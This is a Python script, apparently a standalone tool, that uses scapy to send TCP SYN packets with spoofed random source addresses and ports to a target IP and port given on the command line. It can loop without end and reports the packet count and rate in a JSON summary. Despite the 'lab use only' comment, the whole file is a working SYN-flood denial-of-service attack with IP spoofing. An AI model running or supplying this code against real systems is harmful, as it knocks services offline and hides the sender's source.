import argparse
import json
import time

from scapy.all import IP, TCP, RandIP, RandShort, send

# For authorized/lab use only. Running this against systems you do not own
# or have explicit written permission to test is illegal.

parser = argparse.ArgumentParser(description="SYN Flood Simulator (lab use only)")
parser.add_argument("--target", required=True, help="Target IP address")
parser.add_argument("--port", type=int, required=True, help="Target port")
parser.add_argument("--count", type=int, default=100, help="Number of SYN packets to send (0 = infinite)")
parser.add_argument("--output", help="Write flood summary to a JSON file")
args = parser.parse_args()


def syn_flood(target, port, count):
    packet = IP(dst=target, src=RandIP()) / TCP(dport=port, sport=RandShort(), flags="S")
    started_at = time.time()

    if count == 0:
        send(packet, loop=1, verbose=False)
    else:
        send(packet, count=count, verbose=False)
        print(f"Sent {count} SYN packets to {target}:{port}")
        duration = round(time.time() - started_at, 3)
        summary = {
            "target": target,
            "port": port,
            "sent_packets": count,
            "duration_seconds": duration,
            "approx_packets_per_second": round(count / duration, 3) if duration else None,
        }
        print(json.dumps(summary, indent=2))

        if args.output:
            with open(args.output, "w", encoding="utf-8") as handle:
                json.dump(summary, handle, indent=2)

syn_flood(args.target, args.port, args.count)
